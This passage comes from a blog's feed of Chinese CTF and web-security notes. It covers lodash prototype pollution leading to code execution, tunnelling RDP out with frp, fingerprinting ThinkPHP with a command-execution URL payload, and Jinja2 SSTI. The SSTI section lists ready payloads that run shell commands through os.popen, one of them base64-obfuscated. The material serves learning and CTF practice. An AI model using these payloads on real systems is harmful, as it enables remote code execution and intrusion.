class="keyword">key</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;<span class="selector-tag">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="selector-tag">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="function"><span class="title">merge</span><span class="params">(o1, o2)</span></span></span><br><span class="line">console<span class="selector-class">.log</span>(o1<span class="selector-class">.a</span>, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console<span class="selector-class">.log</span>(o3.b)</span><br></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = JSON.parse(&#x27;&#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;&#125;&#x27;)</span><br><span class="line"><span class="function"><span class="title">merge</span><span class="params">(o1, o2)</span></span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span><span class="params">(o1.a, o1.b)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">o3</span> = &#123;&#125;</span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span><span class="params">(o3.b)</span></span></span><br></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><h2 id="0x05-Code-Breaking-2018-Thejs-分析"><a href="#0x05-Code-Breaking-2018-Thejs-分析" class="headerlink" title="0x05 Code-Breaking 2018 Thejs 分析"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs">0x05 Code-Breaking 2018 Thejs 分析</a></h2><p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;ejs&#x27;</span>, <span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) &#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.<span class="title function_">template</span>(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = <span class="title function_">compiled</span>(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">language</span>: data.<span class="property">language</span>, </span><br><span class="line">        <span class="attr">category</span>: data.<span class="property">category</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p><ol><li><code>lodash.template</code> 一个简单的模板引擎</li><li><code>lodash.merge</code> 函数或对象的合并</li></ol><p>其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p><p>而这里的<code>lodash.merge</code>操作实际上就存在原型链污染漏洞。</p><p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。我们看到<code>lodash.template</code>的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.sourceURL + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">Function</span>(<span class="params">importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source</span>)</span><br><span class="line">  .<span class="title function_">apply</span>(<span class="params">undefined, importsValues</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p><p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p><p>我将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p><p>可见，我们代码执行成功，返回了id命令的结果。</p><p>整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。</p><p>我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。</p>]]></content>
    
    
    <summary type="html">🥧深入理解 JavaScript Prototype 污染攻击</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>流量代理和frp使用</title>
    <link href="https://example.com/posts/502156a3.html"/>
    <id>https://example.com/posts/502156a3.html</id>
    <published>2024-12-01T15:08:25.776Z</published>
    <updated>2024-12-01T16:06:22.817Z</updated>
    
    <content type="html"><![CDATA[<p>流量代理:<a href="https://blog.csdn.net/zkaqlaoniao/article/details/138181219">https://blog.csdn.net/zkaqlaoniao/article/details/138181219</a></p><p>frp实现内网端口转发<a href="https://www.cnblogs.com/xuanlvsec/p/13723495.html">https://www.cnblogs.com/xuanlvsec/p/13723495.html</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145017.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>frp 是一个高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><ul><li>利用处于防火墙后的机器，对外网环境提供 http 或 https 服务。</li><li>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</li><li>利用处于防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司局部环境的主机。</li></ul><p>（摘自百度百科）</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>准备一台内网windows服务器虚拟机</p><p>一台公网服务器</p><p>一台pc（不要是windows虚拟机的宿主机）</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内网windows服务器         <span class="number">192</span><span class="number">.168</span><span class="number">.244</span><span class="number">.130</span></span><br><span class="line">公网linux服务器           <span class="number">152</span>.<span class="keyword">X</span>.<span class="keyword">X</span>.<span class="keyword">X</span></span><br></pre></td></tr></table></figure><p>设置内网Windows服务器防火墙不放行3389端口</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924102912758-167415936.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2163870-20200924102912758-167415936.png" alt="img"></a></p><h2 id="frp下载"><a href="#frp下载" class="headerlink" title="frp下载"></a>frp下载</h2><p>Github地址:<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>本次试验用的是一台linux服务器和一台windows服务器，下载的时候记得下载对应操作系统</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">frp_0</span>.<span class="number">34</span>.<span class="number">0</span>_windows_amd64.zip</span><br><span class="line"><span class="attribute">frp_0</span>.<span class="number">34</span>.<span class="number">0</span>_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="开整"><a href="#开整" class="headerlink" title="开整"></a>开整</h2><p>本次的试验目的是在另一台pc上连接内网服务器的3389端口，在环境搭建阶段我们已经将防火墙打开，而且由于pc和内网服务器不在同一网段，所以是无法直接连3389的，因此，我们需要将内网服务器的3389转发出来，转发到公网服务器的一个端口上，这样我们通过连接公网服务器的某个端口，就可以访问内网服务器的3389了。整个流程如下。（没啥专业的画图软件只能用windwos自带的画图了，原谅我的灵魂画术）</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924105019581-737106838.png"><img src="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924105019581-737106838.png" alt="img"></a></p><p> <strong>第一步 将frp上传到公网服务器和内网服务器上</strong></p><p> 将对应操作系统的包分别上传到两台服务器上</p><p><strong>第二步 配置客户端及服务端，并启动</strong></p><p>我们将window服务器作为客户端，公网服务器作为服务端</p><p>先配置服务端</p><p>编辑frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p>打开文件默认就是这个，不用动，保持这样就行，这是配置服务端的端口，然后用下面的命令启动服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p>启动完了以后先放着，再配置客户端</p><p>编辑Windows服务器上的frpc.ini,做如下配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">152</span>.x.x.x     <span class="comment">#服务端ip，也就是公网服务器ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span>          <span class="comment">#服务器端口</span></span><br><span class="line"><span class="section">[ssh]</span>                       <span class="comment">#这个是节点名称，可以随便写</span></span><br><span class="line"><span class="attr">type</span> = tcp                  <span class="comment">#通信协议</span></span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span>        <span class="comment">#本地地址</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">3389</span>           <span class="comment">#要转发的端口</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span>          <span class="comment">#要转发到的远程端口</span></span><br></pre></td></tr></table></figure><p>配置完成后，运行以下命令启动客户端</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -<span class="keyword">c</span> frpc.ini</span><br></pre></td></tr></table></figure><p>随后就能看到服务端显示有新的客户端连进来了</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120358152-425470860.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2163870-20200924120358152-425470860.png" alt="img"></a></p><p> <strong>第三步 连接远程桌面</strong></p><p>使用pc连接公网服务器的6000端口，连接成功</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120845320-361076319.png"><img src="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120845320-361076319.png" alt="img"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>内网端口转发和反向隧道的建立大多数工具都是这种方式，内网做客户端主动向外网服务端通信，了解了这种方式就能更好的理解大多数端口转发的操作了。</p>]]></content>
    
    
    <summary type="html">🥧流量代理和frp使用</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>tp漏洞</title>
    <link href="https://example.com/posts/3b315222.html"/>
    <id>https://example.com/posts/3b315222.html</id>
    <published>2024-12-01T15:07:55.031Z</published>
    <updated>2024-12-01T16:06:22.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tp漏洞"><a href="#tp漏洞" class="headerlink" title="tp漏洞"></a>tp漏洞</h1><h2 id="一-识别tp框架-指纹"><a href="#一-识别tp框架-指纹" class="headerlink" title="一-识别tp框架(指纹)"></a>一-识别tp框架(指纹)</h2><h3 id="1-1-ioc判断"><a href="#1-1-ioc判断" class="headerlink" title="1.1 ioc判断"></a>1.1 ioc判断</h3><p>/favicon.ico</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20516b1e8de85b6b95343771b66b44df.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125193711067.png" alt="image-20241125193711067"></p><h3 id="1-2报错"><a href="#1-2报错" class="headerlink" title="1.2报错"></a>1.2报错</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1c8c509ef3f760f24376d38f6a7625c8.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3b4ccc2eacbbf6163c0ef584d7aeb544.png" alt="img"></p><p>或者 /index.php/index/index/1</p><h3 id="1-3错误传参"><a href="#1-3错误传参" class="headerlink" title="1.3错误传参"></a>1.3错误传参</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/479046ae0c8bf91e2d32d17acc474db9.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebf2fd7c4ce6bf62b49083a7085bd599.png" alt="img"></p><h3 id="1-4特殊指纹出现logo"><a href="#1-4特殊指纹出现logo" class="headerlink" title="1.4特殊指纹出现logo"></a>1.4特殊指纹出现logo</h3><p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a</p><p>/4e5e5d7364f443e28fbf0d3ae744a59a</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3ddc4ccf08674da045f360091d24546e.png" alt="img"></p><p>p3.1和3.2版本</p><p>4e5e5d7364f443e28fbf0d3ae744a59a-index.html</p><h3 id="1-5-body特征"><a href="#1-5-body特征" class="headerlink" title="1.5 body特征"></a>1.5 body特征</h3><p>body里有”十年磨一剑” 或者”ThinkPHP”</p><h3 id="1-6插件"><a href="#1-6插件" class="headerlink" title="1.6插件"></a>1.6插件</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0684f3dbf50af3128a16c0a775d03eb4.png" alt="img"></p><h2 id="二、利用方法"><a href="#二、利用方法" class="headerlink" title="二、利用方法"></a>二、利用方法</h2><p>数据通过竖线分开, 前面为参数, 后面为函数。例如：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cacheTime=<span class="number">0</span>&amp;isCache=<span class="keyword">ls</span>|<span class="built_in">system</span>  </span><br><span class="line">/<span class="built_in">index</span>.php/?cacheTime=<span class="number">0</span>&amp;isCache=<span class="keyword">ls</span>|<span class="built_in">system</span>   #上面不行就换下面</span><br></pre></td></tr></table></figure><p>根据 thinkphp 的路由规则：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于ThinkPHP存在两种路由规则，如下所示</span><br><span class="line"><span class="link">http://serverName/index.php/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line"><span class="link">http://serverName/index.php?s=/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">也可采用 index.php/a/b/c/$&#123;code&#125;一下形式。</span><br></pre></td></tr></table></figure><p>访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里。</p><p>所以一般要先加上路由路径。</p>]]></content>
    
    
    <summary type="html">🥧tp漏洞</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>SSTI漏洞</title>
    <link href="https://example.com/posts/60e82712.html"/>
    <id>https://example.com/posts/60e82712.html</id>
    <published>2024-12-01T15:07:55.027Z</published>
    <updated>2024-12-01T16:14:19.356Z</updated>
    
    <content type="html"><![CDATA[<p>SSTI漏洞：</p><p>超详细SSTI模板注入漏洞原理讲解_ssti注入-CSDN博客：<a href="https://blog.csdn.net/qq_61955196/article/details/132237648">https://blog.csdn.net/qq_61955196/article/details/132237648</a></p><p>焚靖工具安装:<a href="https://blog.csdn.net/m0_73683234/article/details/136789243">https://blog.csdn.net/m0_73683234/article/details/136789243</a></p><p>判断方法：</p><p>变量名=49   ＃如果正常回显，说明存在SSTI漏洞</p><p>python中的特殊属性：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c91f104c1ff705ad11a5a16052b6edc2.png" alt=""></p><p>常用的解题payload:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4076ea7b77cac94b078adab61bece939.png" alt=""></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">lipsum.__globals__.__builtins__.__import__</span>(<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>[&#x27;__buitlins__&#x27;][&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__init__.globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">*</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">*</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27; ` echo Y2F0IC9mKg== | base64 -d ` &#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>出现过滤，常用的绕过方法：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><p>绕过{}      %</p><p>绕过.        []</p><p>例子：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a33d47e40bdd2fe070a2ed06f4713b.png" alt=""></p><h2 id="详解："><a href="#详解：" class="headerlink" title="详解："></a>详解：</h2><p>SSTI漏洞原理<br>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p><p>这么说可能有点抽象，我们看一下下面的python中的基于jinja2的模板渲染</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/myan&quot;</span></span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h3&gt; Hello %s&#x27;&#x27;&#x27;</span>%name</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>运行后访问<a href="http://127.0.0.1:5000/myan可以发现默认的模板解析参数为guest">http://127.0.0.1:5000/myan可以发现默认的模板解析参数为guest</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d466bfa55bc9ea012079b9bf65a75bb9.png" alt="img"></p><p> 从上面的python代码中我们发现服务端的逻辑是接收前端输入的name参数，然后将其返回到后端进行拼接再返回前端进行展示，当我们输入?name=myan时可以发现前端返回结果</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3d9ff35c53bc54aab6e8fc73de499711.png" alt="img"></p><blockquote><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">模板渲染函数</span></span><br><span class="line"><span class="language-xml">这里主要有两种模板渲染函数，render_template_string()与render_template()，其中render_template是用来渲染一个指定文件的。render_template_string()则是用来渲染字符串的。而渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即：</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml">在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml">包裹的内容当做变量解析替换。比如</span><span class="template-variable">&#123;&#123;<span class="name">2</span>*<span class="number">2</span>&#125;&#125;</span><span class="language-xml">会被解析成4。因此才有了现在的模板注入漏洞。往往变量我们使用</span><span class="template-variable">&#123;&#123;<span class="name">恶意代码</span>&#125;&#125;</span><span class="language-xml">。正因为</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml">包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="SSTI漏洞攻击方法"><a href="#SSTI漏洞攻击方法" class="headerlink" title="SSTI漏洞攻击方法"></a>SSTI漏洞攻击方法</h2><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><p>这里我想先讲讲类之间的继承关系，因为在后面的攻击中用到的就是这种继承关系的不断调用最终达到一个rce的效果，这里我们就具体讲讲类的继承关系</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/12b88699f2f17cdb66c96df653330b03.png" alt="img"></p><p>可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过<strong>class</strong>魔术方法来找到它的当前类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/32629cc50bef871c175ff2cb97ba6987.png" alt="img"></p><p>可以看到它返回了一个当前的类为C，我们还可以通过<strong>base</strong>这个魔术方法来找到当前类的父类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2fbe9f85aa0cf607d5d5fcc88271531a.png" alt="img"></p><p>可以看到找到了C类的父类B类，如果还想要找B类的父类可以接着使用<strong>base</strong>魔术方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8c05f226639630b4d4ad107563d1c0c3.png" alt="img"></p><p>是没有类了，但是其实所有的类都时object类的子类，当我们创建一个类而没有显式地指定它继承的父类时，这个类就会默认继承object类，因此我们在添加一个<strong>base</strong>就能拿到object</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7d5077f18454f36e57b3f115a9bd759d.png" 